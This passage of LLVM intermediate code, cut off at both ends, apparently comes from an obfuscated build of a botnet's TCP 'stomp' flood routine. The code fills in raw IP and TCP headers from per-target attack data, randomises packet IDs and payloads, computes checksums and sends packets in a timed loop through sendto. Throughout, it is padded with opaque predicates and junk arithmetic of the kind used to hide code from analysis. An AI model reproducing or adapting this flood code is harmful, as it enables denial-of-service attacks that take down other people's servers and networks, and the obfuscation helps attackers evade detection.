  %438 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 9
  store i32 %437, i32* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %441 = load i32, i32* %11, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 3
  %445 = load i16, i16* %444, align 4
  %446 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 0
  store i16 %445, i16* %447, align 4
  %448 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %449 = load i32, i32* %11, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 2
  %454 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 1
  store i16 %453, i16* %455, align 2
  %456 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %457 = load i32, i32* %11, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i32 0, i32 2
  %461 = load i32, i32* %460, align 4
  %462 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 2
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %465 = load i32, i32* %11, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 1
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 3
  store i32 %469, i32* %471, align 4
  %472 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 4
  %474 = load i16, i16* %473, align 4
  %475 = and i16 %474, -241
  %476 = or i16 %475, 128
  store i16 %476, i16* %473, align 4
  %477 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 4
  %479 = load i16, i16* %478, align 4
  %480 = and i16 %479, -257
  %481 = or i16 %480, 256
  store i16 %481, i16* %478, align 4
  %482 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 4
  %484 = load i16, i16* %483, align 4
  %485 = and i16 %484, -4097
  %486 = or i16 %485, 4096
  store i16 %486, i16* %483, align 4
  %487 = call i32 @rand_next()
  %488 = and i32 %487, 65535
  %489 = trunc i32 %488 to i16
  %490 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 5
  store i16 %489, i16* %491, align 2
  %492 = load i8, i8* %20, align 1
  %493 = sext i8 %492 to i16
  %494 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 4
  %496 = load i16, i16* %495, align 4
  %497 = and i16 %493, 1
  %498 = shl i16 %497, 13
  %499 = and i16 %496, -8193
  %500 = or i16 %499, %498
  store i16 %500, i16* %495, align 4
  %501 = load i8, i8* %21, align 1
  %502 = sext i8 %501 to i16
  %503 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 4
  %505 = load i16, i16* %504, align 4
  %506 = and i16 %502, 1
  %507 = shl i16 %506, 12
  %508 = and i16 %505, -4097
  %509 = or i16 %508, %507
  store i16 %509, i16* %504, align 4
  %510 = load i8, i8* %22, align 1
  %511 = sext i8 %510 to i16
  %512 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %511, 1
  %516 = shl i16 %515, 11
  %517 = and i16 %514, -2049
  %518 = or i16 %517, %516
  store i16 %518, i16* %513, align 4
  %519 = load i8, i8* %23, align 1
  %520 = sext i8 %519 to i16
  %521 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 4
  %523 = load i16, i16* %522, align 4
  %524 = and i16 %520, 1
  %525 = shl i16 %524, 10
  %526 = and i16 %523, -1025
  %527 = or i16 %526, %525
  store i16 %527, i16* %522, align 4
  %528 = load i8, i8* %24, align 1
  %529 = sext i8 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 4
  %532 = load i16, i16* %531, align 4
  %533 = and i16 %529, 1
  %534 = shl i16 %533, 9
  %535 = and i16 %532, -513
  %536 = or i16 %535, %534
  store i16 %536, i16* %531, align 4
  %537 = load i8, i8* %25, align 1
  %538 = sext i8 %537 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 4
  %541 = load i16, i16* %540, align 4
  %542 = and i16 %538, 1
  %543 = shl i16 %542, 8
  %544 = and i16 %541, -257
  %545 = or i16 %544, %543
  store i16 %545, i16* %540, align 4
  %546 = load i8*, i8** %41, align 8
  %547 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %546, i32 %547)
  %548 = load i8*, i8** %41, align 8
  %549 = load i32, i32* %26, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds i8, i8* %548, i64 %550
  store i8 0, i8* %551, align 1
  br label %599

; <label>:552:                                    ; preds = %307, %299
  %553 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 4
  %555 = load i16, i16* %554, align 4
  %556 = lshr i16 %555, 8
  %557 = and i16 %556, 1
  %558 = zext i16 %557 to i32
  %559 = icmp ne i32 %558, 0
  br i1 %559, label %584, label %560

; <label>:560:                                    ; preds = %552
  %561 = load i32, i32* @x.27
  %562 = load i32, i32* @y.28
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %560
  %569 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 4
  %571 = load i16, i16* %570, align 4
  %572 = lshr i16 %571, 10
  %573 = and i16 %572, 1
  %574 = zext i16 %573 to i32
  %575 = icmp ne i32 %574, 0
  %576 = load i32, i32* @x.27
  %577 = load i32, i32* @y.28
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart260, label %originalBB50alteredBB

originalBBpart260:                                ; preds = %originalBB50
  br i1 %575, label %584, label %587

; <label>:584:                                    ; preds = %originalBBpart260, %552
  %585 = load i32, i32* %29, align 4
  %586 = call i32 @close(i32 %585)
  br label %161

; <label>:587:                                    ; preds = %originalBBpart260
  br label %588

; <label>:588:                                    ; preds = %587
  br label %589

; <label>:589:                                    ; preds = %588, %287
  br label %590

; <label>:590:                                    ; preds = %589, %283, %275
  %591 = call i64 @time(i64* null) #6
  %592 = load i64, i64* %34, align 8
  %593 = sub nsw i64 %591, %592
  %594 = icmp sgt i64 %593, 10
  br i1 %594, label %595, label %598

; <label>:595:                                    ; preds = %590
  %596 = load i32, i32* %29, align 4
  %597 = call i32 @close(i32 %596)
  br label %161

; <label>:598:                                    ; preds = %590
  br label %263

; <label>:599:                                    ; preds = %426
  br label %600

; <label>:600:                                    ; preds = %599, %originalBBpart28
  %601 = load i32, i32* %11, align 4
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %11, align 4
  br label %139

; <label>:603:                                    ; preds = %139
  %604 = load i32, i32* @x.27
  %605 = load i32, i32* @y.28
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %603
  %612 = load i32, i32* @x.27
  %613 = load i32, i32* @y.28
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %620

; <label>:620:                                    ; preds = %804, %originalBBpart264
  %621 = load i32, i32* @x.27
  %622 = load i32, i32* @y.28
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %620
  store i32 0, i32* %11, align 4
  %629 = load i32, i32* @x.27
  %630 = load i32, i32* @y.28
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %637

; <label>:637:                                    ; preds = %779, %originalBBpart268
  %638 = load i32, i32* @x.27
  %639 = load i32, i32* @y.28
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %637
  %646 = load i32, i32* %11, align 4
  %647 = load i8, i8* %7, align 1
  %648 = zext i8 %647 to i32
  %649 = icmp slt i32 %646, %648
  %650 = load i32, i32* @x.27
  %651 = load i32, i32* @y.28
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %649, label %658, label %782

; <label>:658:                                    ; preds = %originalBBpart272
  %659 = load i8**, i8*** %14, align 8
  %660 = load i32, i32* %11, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds i8*, i8** %659, i64 %661
  %663 = load i8*, i8** %662, align 8
  store i8* %663, i8** %42, align 8
  %664 = load i8*, i8** %42, align 8
  %665 = bitcast i8* %664 to %struct.iphdr*
  store %struct.iphdr* %665, %struct.iphdr** %43, align 8
  %666 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %667 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %666, i64 1
  %668 = bitcast %struct.iphdr* %667 to %struct.tcphdr*
  store %struct.tcphdr* %668, %struct.tcphdr** %44, align 8
  %669 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i64 1
  %671 = bitcast %struct.tcphdr* %670 to i8*
  store i8* %671, i8** %45, align 8
  %672 = load i16, i16* %16, align 2
  %673 = zext i16 %672 to i32
  %674 = icmp eq i32 %673, 65535
  br i1 %674, label %675, label %681

; <label>:675:                                    ; preds = %658
  %676 = call i32 @rand_next()
  %677 = and i32 %676, 65535
  %678 = trunc i32 %677 to i16
  %679 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %680 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %679, i32 0, i32 3
  store i16 %678, i16* %680, align 4
  br label %681

; <label>:681:                                    ; preds = %675, %658
  %682 = load i32, i32* @x.27
  %683 = load i32, i32* @y.28
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %681
  %690 = load i8, i8* %27, align 1
  %691 = icmp ne i8 %690, 0
  %692 = load i32, i32* @x.27
  %693 = load i32, i32* @y.28
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %691, label %700, label %707

; <label>:700:                                    ; preds = %originalBBpart276
  %701 = load i8*, i8** %45, align 8
  %702 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %701, i32 %702)
  %703 = load i8*, i8** %45, align 8
  %704 = load i32, i32* %26, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds i8, i8* %703, i64 %705
  store i8 0, i8* %706, align 1
  br label %707

; <label>:707:                                    ; preds = %700, %originalBBpart276
  %708 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 7
  store i16 0, i16* %709, align 2
  %710 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %711 = bitcast %struct.iphdr* %710 to i16*
  %712 = call zeroext i16 @checksum_generic(i16* %711, i32 20)
  %713 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %714 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %713, i32 0, i32 7
  store i16 %712, i16* %714, align 2
  %715 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %716 = load i32, i32* %11, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %715, i64 %717
  %719 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %718, i32 0, i32 1
  %720 = load i32, i32* %719, align 4
  %721 = add i32 %720, 1
  store i32 %721, i32* %719, align 4
  %722 = trunc i32 %720 to i16
  %723 = call zeroext i16 @htons(i16 zeroext %722) #7
  %724 = zext i16 %723 to i32
  %725 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %726 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %725, i32 0, i32 2
  store i32 %724, i32* %726, align 4
  %727 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %728 = load i32, i32* %11, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %727, i64 %729
  %731 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %730, i32 0, i32 2
  %732 = load i32, i32* %731, align 4
  %733 = trunc i32 %732 to i16
  %734 = call zeroext i16 @htons(i16 zeroext %733) #7
  %735 = zext i16 %734 to i32
  %736 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %737 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %736, i32 0, i32 3
  store i32 %735, i32* %737, align 4
  %738 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %739 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %738, i32 0, i32 6
  store i16 0, i16* %739, align 4
  %740 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %741 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %742 = bitcast %struct.tcphdr* %741 to i8*
  %743 = load i32, i32* %26, align 4
  %744 = sext i32 %743 to i64
  %745 = add i64 20, %744
  %746 = trunc i64 %745 to i16
  %747 = call zeroext i16 @htons(i16 zeroext %746) #7
  %748 = load i32, i32* %26, align 4
  %749 = sext i32 %748 to i64
  %750 = add i64 20, %749
  %751 = trunc i64 %750 to i32
  %752 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %740, i8* %742, i16 zeroext %747, i32 %751)
  %753 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i32 0, i32 6
  store i16 %752, i16* %754, align 4
  %755 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %756 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %755, i32 0, i32 1
  %757 = load i16, i16* %756, align 2
  %758 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %759 = load i32, i32* %11, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %758, i64 %760
  %762 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %761, i32 0, i32 0
  %763 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %762, i32 0, i32 1
  store i16 %757, i16* %763, align 2
  %764 = load i32, i32* %12, align 4
  %765 = load i8*, i8** %42, align 8
  %766 = load i32, i32* %26, align 4
  %767 = sext i32 %766 to i64
  %768 = add i64 40, %767
  %769 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %770 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %771 = load i32, i32* %11, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %770, i64 %772
  %774 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %773, i32 0, i32 0
  %775 = bitcast %struct.sockaddr_in* %774 to %struct.sockaddr*
  store %struct.sockaddr* %775, %struct.sockaddr** %769, align 8
  %776 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %777 = load %struct.sockaddr*, %struct.sockaddr** %776, align 8
  %778 = call i64 @sendto(i32 %764, i8* %765, i64 %768, i32 16384, %struct.sockaddr* %777, i32 16)
  br label %779

; <label>:779:                                    ; preds = %707
  %780 = load i32, i32* %11, align 4
  %781 = add nsw i32 %780, 1
  store i32 %781, i32* %11, align 4
  br label %637

; <label>:782:                                    ; preds = %originalBBpart272
  %783 = load i32, i32* @x.27
  %784 = load i32, i32* @y.28
  %785 = sub i32 %783, 1
  %786 = mul i32 %783, %785
  %787 = urem i32 %786, 2
  %788 = icmp eq i32 %787, 0
  %789 = icmp slt i32 %784, 10
  %790 = or i1 %788, %789
  br i1 %790, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %782
  %791 = call i64 @time(i64* null) #6
  %792 = load i32, i32* %28, align 4
  %793 = sext i32 %792 to i64
  %794 = icmp sgt i64 %791, %793
  %795 = load i32, i32* @x.27
  %796 = load i32, i32* @y.28
  %797 = sub i32 %795, 1
  %798 = mul i32 %795, %797
  %799 = urem i32 %798, 2
  %800 = icmp eq i32 %799, 0
  %801 = icmp slt i32 %796, 10
  %802 = or i1 %800, %801
  br i1 %802, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %794, label %803, label %804

; <label>:803:                                    ; preds = %originalBBpart280
  br label %805

; <label>:804:                                    ; preds = %originalBBpart280
  br label %620

; <label>:805:                                    ; preds = %803, %274, %originalBBpart2, %113
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %119
  %806 = load i32, i32* %12, align 4
  %807 = call i32 @close(i32 %806)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %144
  store i32 0, i32* %29, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %164
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %217
  %808 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %809 = load i32, i32* %11, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %808, i64 %810
  %812 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %811, i32 0, i32 1
  %813 = load i32, i32* %812, align 4
  %814 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %815 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %814, i32 0, i32 0
  store i32 %813, i32* %815, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %315
  %816 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %817 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %816, i32 0, i32 0
  %818 = load i32, i32* %817, align 4
  %819 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %820 = load i32, i32* %11, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %819, i64 %821
  %823 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %822, i32 0, i32 0
  store i32 %818, i32* %823, align 4
  %824 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %825 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %824, i32 0, i32 2
  %826 = load i32, i32* %825, align 4
  %827 = call i32 @ntohl(i32 %826) #7
  %828 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %829 = load i32, i32* %11, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %828, i64 %830
  %832 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %831, i32 0, i32 1
  store i32 %827, i32* %832, align 4
  %833 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 3
  %835 = load i32, i32* %834, align 4
  %836 = call i32 @ntohl(i32 %835) #7
  %837 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %838 = load i32, i32* %11, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %837, i64 %839
  %841 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %840, i32 0, i32 2
  store i32 %836, i32* %841, align 4
  %842 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %843 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %842, i32 0, i32 1
  %844 = load i16, i16* %843, align 2
  %845 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %846 = load i32, i32* %11, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %845, i64 %847
  %849 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %848, i32 0, i32 3
  store i16 %844, i16* %849, align 4
  %850 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %851 = load i16, i16* %850, align 2
  %852 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %853 = load i32, i32* %11, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %852, i64 %854
  %856 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %855, i32 0, i32 4
  store i16 %851, i16* %856, align 2
  %857 = load i32, i32* %26, align 4
  %858 = sext i32 %857 to i64
  %_ = shl i64 40, %858
  %_15 = sub i64 0, 40
  %gen = add i64 %_15, %858
  %_16 = shl i64 40, %858
  %859 = add i64 40, %858
  %860 = call noalias i8* @malloc(i64 %859) #6
  %861 = load i8**, i8*** %14, align 8
  %862 = load i32, i32* %11, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds i8*, i8** %861, i64 %863
  store i8* %860, i8** %864, align 8
  %865 = load i8**, i8*** %14, align 8
  %866 = load i32, i32* %11, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds i8*, i8** %865, i64 %867
  %869 = load i8*, i8** %868, align 8
  %870 = bitcast i8* %869 to %struct.iphdr*
  store %struct.iphdr* %870, %struct.iphdr** %39, align 8
  %871 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %872 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %871, i64 1
  %873 = bitcast %struct.iphdr* %872 to %struct.tcphdr*
  store %struct.tcphdr* %873, %struct.tcphdr** %40, align 8
  %874 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %875 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %874, i64 1
  %876 = bitcast %struct.tcphdr* %875 to i8*
  store i8* %876, i8** %41, align 8
  %877 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %878 = bitcast %struct.iphdr* %877 to i8*
  %879 = load i8, i8* %878, align 4
  %_17 = sub i8 %879, 15
  %gen18 = mul i8 %_17, 15
  %_19 = sub i8 %879, 15
  %gen20 = mul i8 %_19, 15
  %880 = and i8 %879, 15
  %_21 = sub i8 %880, 64
  %gen22 = mul i8 %_21, 64
  %_23 = sub i8 %880, 64
  %gen24 = mul i8 %_23, 64
  %881 = or i8 %880, 64
  store i8 %881, i8* %878, align 4
  %882 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %883 = bitcast %struct.iphdr* %882 to i8*
  %884 = load i8, i8* %883, align 4
  %_25 = sub i8 0, %884
  %gen26 = add i8 %_25, -16
  %_27 = sub i8 0, %884
  %gen28 = add i8 %_27, -16
  %885 = and i8 %884, -16
  %_29 = sub i8 0, %885
  %gen30 = add i8 %_29, 5
  %_31 = sub i8 0, %885
  %gen32 = add i8 %_31, 5
  %_33 = sub i8 0, %885
  %gen34 = add i8 %_33, 5
  %_35 = sub i8 %885, 5
  %gen36 = mul i8 %_35, 5
  %_37 = sub i8 %885, 5
  %gen38 = mul i8 %_37, 5
  %_39 = sub i8 %885, 5
  %gen40 = mul i8 %_39, 5
  %886 = or i8 %885, 5
  store i8 %886, i8* %883, align 4
  %887 = load i8, i8* %15, align 1
  %888 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %889 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %888, i32 0, i32 1
  store i8 %887, i8* %889, align 1
  %890 = load i32, i32* %26, align 4
  %891 = sext i32 %890 to i64
  %_41 = sub i64 0, 40
  %gen42 = add i64 %_41, %891
  %_43 = sub i64 0, 40
  %gen44 = add i64 %_43, %891
  %_45 = sub i64 40, %891
  %gen46 = mul i64 %_45, %891
  %892 = add i64 40, %891
  %893 = trunc i64 %892 to i16
  %894 = call zeroext i16 @htons(i16 zeroext %893) #7
  %895 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %896 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %895, i32 0, i32 2
  store i16 %894, i16* %896, align 2
  %897 = load i16, i16* %16, align 2
  %898 = call zeroext i16 @htons(i16 zeroext %897) #7
  %899 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %900 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %899, i32 0, i32 3
  store i16 %898, i16* %900, align 4
  %901 = load i8, i8* %17, align 1
  %902 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %903 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %902, i32 0, i32 5
  store i8 %901, i8* %903, align 4
  %904 = load i8, i8* %18, align 1
  %905 = icmp ne i8 %904, 0
  br label %originalBB14

originalBB50alteredBB:                            ; preds = %originalBB50, %560
  %906 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %907 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %906, i32 0, i32 4
  %908 = load i16, i16* %907, align 4
  %_51 = sub i16 0, %908
  %gen52 = add i16 %_51, 10
  %_53 = sub i16 0, %908
  %gen54 = add i16 %_53, 10
  %_55 = shl i16 %908, 10
  %909 = lshr i16 %908, 10
  %_56 = shl i16 %909, 1
  %_57 = sub i16 %909, 1
  %gen58 = mul i16 %_57, 1
  %910 = and i16 %909, 1
  %911 = zext i16 %910 to i32
  %912 = icmp ne i32 %911, 0
  br label %originalBB50

originalBB62alteredBB:                            ; preds = %originalBB62, %603
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %620
  store i32 0, i32* %11, align 4
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %637
  %913 = load i32, i32* %11, align 4
  %914 = load i8, i8* %7, align 1
